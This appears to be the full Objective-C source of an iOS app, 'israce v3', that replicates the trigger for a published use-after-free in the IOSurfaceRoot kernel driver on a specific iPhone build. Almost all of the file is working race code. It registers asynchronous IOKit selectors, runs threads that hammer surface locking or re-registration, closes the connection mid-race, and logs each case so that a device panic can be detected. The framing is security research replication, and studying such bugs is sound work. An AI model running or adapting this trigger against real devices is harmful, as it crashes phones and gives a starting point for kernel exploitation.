// israce v3: faithful trigger replication of the published iOS 27.0.1 IOSurfaceRoot
// registry-node UAF (CVE-2026-112477) on iPhone18,5 / 24A446.
// Method follows Kimi-2011's public research notes (github.com/Kimi-2011/ios27-iosurface-uaf,
// out/RESEARCH-IOSURFACE-UAF.md): async sel17 register with wake port + ref, surface under
// concurrent lock/unlock pressure, jittered sleep, IOServiceClose before CFRelease.
// Implementation written fresh from the published recipe; credit to the original research.
// Evidence design: ndjson begin/end per case, fflush each line; a panic leaves "begin without end".
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <mach/mach.h>
#import <pthread.h>
#import <sys/time.h>
#import <unistd.h>
#import <IOKit/IOReturn.h>
#import <IOKit/IOKitLib.h>

#define SEL_REG 17
#define SEL_DEREG 18

static NSString *gDoc = nil;
static FILE *gLog = NULL, *gNd = NULL;
static pthread_mutex_t gMx = PTHREAD_MUTEX_INITIALIZER;
static double gT0 = 0;
static volatile int gStop = 0, gPhase = 0;
static int gCaseRan = 0, gEnds = 0, gOK = 0;
static NSMutableSet *gDone = nil;

static double nowSec(void) { struct timeval tv; gettimeofday(&tv, NULL);
  return (double)tv.tv_sec + tv.tv_usec / 1e6 - gT0; }
static uint64_t nowNs(void) { struct timeval tv; gettimeofday(&tv, NULL);
  return (uint64_t)tv.tv_sec * 1000000000ull + (uint64_t)tv.tv_usec * 1000ull; }

static void L(NSString *fmt, ...) {
  if (!gLog) return; va_list a; va_start(a, fmt);
  NSString *s = [[NSString alloc] initWithFormat:fmt arguments:a]; va_end(a);
  pthread_mutex_lock(&gMx); fprintf(gLog, "%s\n", s.UTF8String); fflush(gLog); pthread_mutex_unlock(&gMx);
}
static void ND(NSString *line) {
  if (!gNd) return;
  pthread_mutex_lock(&gMx); fprintf(gNd, "%s\n", line.UTF8String); fflush(gNd); pthread_mutex_unlock(&gMx);
}
static void beginCase(NSString *k) { ND([NSString stringWithFormat:@"{\"k\":\"%@\",\"ph\":\"begin\",\"t\":%.3f}", k, nowSec()]); }
static void endCase(NSString *k, NSString *f) { ND([NSString stringWithFormat:@"{\"k\":\"%@\",\"ph\":\"end\",\"t\":%.3f%@}", k, nowSec(), f ? f : @""]); gEnds++; }
static void noteEvent(NSString *ev, NSString *f) { ND([NSString stringWithFormat:@"{\"k\":\"@%@\",\"ph\":\"note\",\"t\":%.3f%@}", ev, nowSec(), f ? f : @""]); }

// ---- IOSurface private API ----
typedef struct __IOSurface *IOSurfaceRef_;
static IOSurfaceRef_ (*pCreate)(CFDictionaryRef);
static uint32_t (*pGetID)(IOSurfaceRef_);
static kern_return_t (*pLock)(IOSurfaceRef_, uint32_t, uint32_t *);
static kern_return_t (*pUnlock)(IOSurfaceRef_, uint32_t, uint32_t *);
static void loadIOSurface(void) {
  void *h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
  if (!h) h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
  pCreate = dlsym(h, "IOSurfaceCreate");
  pGetID = dlsym(h, "IOSurfaceGetID");
  pLock = dlsym(h, "IOSurfaceLock");
  pUnlock = dlsym(h, "IOSurfaceUnlock");
  L(@"iosurface syms create=%d getid=%d lock=%d unlock=%d", !!pCreate, !!pGetID, !!pLock, !!pUnlock);
}
static IOSurfaceRef_ mkSurface(void) {
  if (!pCreate) return NULL;
  int w = 64, h = 4, bpe = 4, pf = 0x42475241;
  CFNumberRef W = CFNumberCreate(NULL, kCFNumberIntType, &w);
  CFNumberRef H = CFNumberCreate(NULL, kCFNumberIntType, &h);
  CFNumberRef B = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
  CFNumberRef P = CFNumberCreate(NULL, kCFNumberIntType, &pf);
  const void *vk[4] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                        CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
  const void *vv[4] = { W, H, B, P };
  CFDictionaryRef d = CFDictionaryCreate(NULL, vk, vv, 4, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
  IOSurfaceRef_ s = pCreate(d);
  CFRelease(d); CFRelease(W); CFRelease(H); CFRelease(B); CFRelease(P);
  return s;
}

// ---- IOKit ----
static io_service_t gSvc = 0;
static int openConn(io_connect_t *out) { return IOServiceOpen(gSvc, mach_task_self(), 0, out); }
static mach_port_t newWakePort(void) {
  mach_port_t p = MACH_PORT_NULL;
  if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) return MACH_PORT_NULL;
  return p;
}
static void dropPort(mach_port_t p) {
  if (p) mach_port_mod_refs(mach_task_self(), p, MACH_PORT_RIGHT_RECEIVE, -1);
}
// async sel17: wake port + 1 reference, 24-byte struct input {1,2,3}
static kern_return_t regAsync(io_connect_t c, mach_port_t wp) {
  uint64_t in[3] = { 1, 2, 3 };
  uint64_t ref = 0x1122334455667788ull;
  uint32_t soc = 0;
  return IOConnectCallAsyncMethod(c, SEL_REG, wp, &ref, 1, NULL, 0, in, 24, NULL, &soc, NULL, NULL);
}
static kern_return_t regSync(io_connect_t c) {
  uint64_t in[3] = { 1, 2, 3 };
  return IOConnectCallMethod(c, SEL_REG, NULL, 0, in, 24, NULL, NULL, NULL, NULL);
}
static kern_return_t deregSync(io_connect_t c, mach_port_t wp) {
  uint64_t in[3] = { 1, 2, 3 };
  uint32_t soc = 0;
  return IOConnectCallAsyncMethod(c, SEL_DEREG, wp, NULL, 0, NULL, 0, in, 24, NULL, &soc, NULL, NULL);
}

// ---- pressure threads ----
static volatile int gRun = 0;
static io_connect_t gConn = 0;
static mach_port_t gConnWp = MACH_PORT_NULL;
static IOSurfaceRef_ gSurf = NULL;
static volatile uint64_t gOps = 0;
static void *spamLock(void *arg) {
  IOSurfaceRef_ s = (IOSurfaceRef_)arg; uint32_t seed = 0;
  while (gRun) { if (pLock) pLock(s, 0, &seed); if (pUnlock) pUnlock(s, 0, &seed); __sync_fetch_and_add(&gOps, 1); }
  return NULL;
}
static void *spamReg(void *arg) {
  (void)arg;
  while (gRun) { regAsync(gConn, gConnWp); __sync_fetch_and_add(&gOps, 1); }
  return NULL;
}

// ---- variants ----
// V_LOCKDEG: register, surface + 4 lock/unlock threads, jittered sleep, close, brief settle, stop, release.
// The published hit case: hit at iteration 100 of 200.
static int runLockdeg(int iter) {
  io_connect_t c = 0; mach_port_t wp = newWakePort();
  if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); return -100; }
  kern_return_t r = regAsync(c, wp);
  if (r != KERN_SUCCESS) { L(@"lockdeg i%d reg rc=0x%x", iter, r); IOServiceClose(c); dropPort(wp); return (int)r; }
  IOSurfaceRef_ s = mkSurface();
  if (!s) { IOServiceClose(c); dropPort(wp); return -102; }
  gRun = 1; gOps = 0;
  gOps++;  // the registration above counts as this case's first IOKit op
  pthread_t th[4];
  for (int i = 0; i < 4; i++) pthread_create(&th[i], NULL, spamLock, s);
  usleep(200 + (iter % 40) * 25);
  IOServiceClose(c);            // crash point per research
  gOps++;
  usleep(300);
  gRun = 0;
  for (int i = 0; i < 4; i++) pthread_join(th[i], NULL);
  CFRelease(s);                 // release only after close
  dropPort(wp);
  return 0;
}
// V_RACE1: register + 6 re-register spam threads, jittered sleep, close.
static int runRace1(int iter) {
  io_connect_t c = 0; mach_port_t wp = newWakePort();
  if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); return -100; }
  kern_return_t r = regAsync(c, wp);
  if (r != KERN_SUCCESS) { L(@"race1 i%d reg rc=0x%x", iter, r); IOServiceClose(c); dropPort(wp); return (int)r; }
  gConn = c; gConnWp = wp; gRun = 1; gOps = 0;
  gOps++;  // the registration above counts as this case's first IOKit op
  pthread_t th[6];
  for (int i = 0; i < 6; i++) pthread_create(&th[i], NULL, spamReg, NULL);
  usleep(150 + (iter % 50) * 20);
  IOServiceClose(c);
  gOps++;
  usleep(700);
  gRun = 0;
  for (int i = 0; i < 6; i++) pthread_join(th[i], NULL);
  dropPort(wp);
  return 0;
}
// V_POSTCLOSE: hold an extra send right so the connection survives IOServiceClose;
// then re-register after teardown -> the "deregistered then re-registered" path.
static int runPostclose(int iter) {
  io_connect_t c = 0; mach_port_t wp = newWakePort();
  if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); return -100; }
  mach_port_mod_refs(mach_task_self(), c, MACH_PORT_RIGHT_SEND, +1);
  uint32_t rcs[5] = {0};
  rcs[0] = (uint32_t)regAsync(c, wp);
  rcs[1] = (uint32_t)regAsync(c, wp);
  IOServiceClose(c);
  rcs[2] = (uint32_t)regAsync(c, wp);
  rcs[3] = (uint32_t)regAsync(c, wp);
  rcs[4] = (uint32_t)deregSync(c, wp);
  gOps += 5;  // postclose makes five IOKit calls per case
  mach_port_deallocate(mach_task_self(), c);
  dropPort(wp);
  L(@"postclose i%d rc=0x%x/0x%x/0x%x/0x%x/0x%x", iter, rcs[0], rcs[1], rcs[2], rcs[3], rcs[4]);
  return (rcs[2] == 0) ? 1 : 0;
}

static void loadDone(void) {
  NSString *p = [gDoc stringByAppendingPathComponent:@"israce.ndjson"];
  NSString *s = [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:nil];
  gDone = [NSMutableSet new];
  if (!s) return;
  for (NSString *line in [s componentsSeparatedByString:@"\n"]) {
    if (![line containsString:@"\"ph\":\"end\""]) continue;
    NSRange r1 = [line rangeOfString:@"\"k\":\""];
    if (r1.location == NSNotFound) continue;
    NSUInteger a = r1.location + r1.length;
    NSRange r2 = [line rangeOfString:@"\"" options:0 range:NSMakeRange(a, line.length - a)];
    if (r2.location == NSNotFound) continue;
    [gDone addObject:[line substringWithRange:NSMakeRange(a, r2.location - a)]];
  }
  L(@"resume: %lu ends already on file", (unsigned long)gDone.count);
}

static const double kStartBudget = 100.0;   // seconds of case-running before wrapping up
static void runAll(void) {
  // calibrate: sync must fail (0xE00002C2), async must succeed
  {
    io_connect_t c = 0; mach_port_t wp = newWakePort();
    if (openConn(&c) == KERN_SUCCESS) {
      uint32_t rs = (uint32_t)regSync(c);
      uint32_t ra = (uint32_t)regAsync(c, wp);
      L(@"calib sync=0x%x async=0x%x svc=0x%x", rs, ra, (uint32_t)gSvc);
      noteEvent(@"calib", [NSString stringWithFormat:@",\"sync\":%u,\"async\":%u", rs, ra]);
      if (ra != KERN_SUCCESS) { noteEvent(@"abort", @",\"why\":\"async sel17 did not register\""); IOServiceClose(c); dropPort(wp); return; }
      IOServiceClose(c); dropPort(wp);
    } else { noteEvent(@"abort", @",\"why\":\"open failed\""); return; }
  }
  struct { int v, it; const char *tag; } plan[] = {
    { 2, 40,  "postclose" },
    { 0, 200, "lockdeg" },
    { 1, 100, "race1" },
  };
  int nplan = (int)(sizeof(plan) / sizeof(plan[0]));
  for (int p = 0; p < nplan; p++) {
    for (int i = 0; i < plan[p].it; i++) {
      if (gStop || nowSec() > kStartBudget) {
        noteEvent(@"budget", [NSString stringWithFormat:@",\"at\":\"%s-%d\",\"t\":%.2f", plan[p].tag, i, nowSec()]);
        return;
      }
      NSString *key = [NSString stringWithFormat:@"%s-I%04d", plan[p].tag, i];
      if ([gDone containsObject:key]) continue;
      gPhase = plan[p].v;
      beginCase(key);
      gCaseRan++;
      uint64_t t0 = nowNs();
      int rc = 0;
      @autoreleasepool {
        if (plan[p].v == 0) rc = runLockdeg(i);
        else if (plan[p].v == 1) rc = runRace1(i);
        else rc = runPostclose(i);
      }
      uint64_t ms = (nowNs() - t0) / 1000000ull;
      endCase(key, [NSString stringWithFormat:@",\"v\":%d,\"i\":%d,\"rc\":%d,\"ms\":%llu,\"ops\":%llu",
                    plan[p].v, i, rc, (unsigned long long)ms, (unsigned long long)gOps]);
      if (rc == 0 || rc == 1) gOK++;
    }
    noteEvent(@"phase.done", [NSString stringWithFormat:@",\"tag\":\"%s\",\"t\":%.2f", plan[p].tag, nowSec()]);
    L(@"phase %s done at %.2fs", plan[p].tag, nowSec());
  }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UILabel *label;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)o {
  struct timeval tv; gettimeofday(&tv, NULL);
  gT0 = (double)tv.tv_sec + tv.tv_usec / 1e6;
  gDoc = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
  gLog = fopen([[gDoc stringByAppendingPathComponent:@"israce.log"] UTF8String], "w");
  gNd = fopen([[gDoc stringByAppendingPathComponent:@"israce.ndjson"] UTF8String], "a");
  L(@"probe v3 start t=%.3f doc=%@", nowSec(), gDoc);
  self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
  UIViewController *root = [UIViewController new];
  root.view.backgroundColor = [UIColor blackColor];
  CGRect b = UIScreen.mainScreen.bounds;
  UILabel *lab = [[UILabel alloc] initWithFrame:CGRectMake(16, 80, b.size.width - 32, b.size.height - 160)];
  lab.text = @"israce v3\nreplicating the trigger\nphone may reboot if it hits";
  lab.textColor = [UIColor greenColor];
  lab.numberOfLines = 0;
  lab.font = [UIFont monospacedSystemFontOfSize:14 weight:UIFontWeightRegular];
  lab.textAlignment = NSTextAlignmentCenter;
  [root.view addSubview:lab];
  self.label = lab;
  self.window.rootViewController = root;
  [self.window makeKeyAndVisible];
  loadDone();
  dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
    @autoreleasepool {
      loadIOSurface();
      const char *cand[] = { "IOSurfaceRoot", "IOCoreSurfaceRoot", "IOSurface", NULL };
      for (int i = 0; cand[i] && !gSvc; i++) {
        CFMutableDictionaryRef m = IOServiceMatching(cand[i]);
        if (!m) continue;
        io_iterator_t it = 0;
        if (IOServiceGetMatchingServices(kIOMainPortDefault, m, &it) != KERN_SUCCESS || !it) continue;
        io_object_t first = IOIteratorNext(it);
        while (true) { io_object_t o = IOIteratorNext(it); if (!o) break; IOObjectRelease(o); }
        IOObjectRelease(it);
        if (first) gSvc = first;
      }
      L(@"svc=0x%x", (uint32_t)gSvc);
      if (!gSvc) { noteEvent(@"abort", @",\"why\":\"no IOSurfaceRoot service\""); self.label.text = @"no IOSurfaceRoot service"; return; }
      runAll();
      if (!gStop) {
        L(@"probe v3 END (survived all planned cases) ok=%d ends=%d", gOK, gEnds);
        noteEvent(@"summary", [NSString stringWithFormat:@",\"ran\":%d,\"ends\":%d,\"ok\":%d,\"t\":%.2f", gCaseRan, gEnds, gOK, nowSec()]);
        self.label.text = [NSString stringWithFormat:@"survived\nran %d ok %d\n%.1fs", gCaseRan, gOK, nowSec()];
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ exit(0); });
      }
    }
  });
  return YES;
}
@end
int main(int argc, char *argv[]) { @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); } }
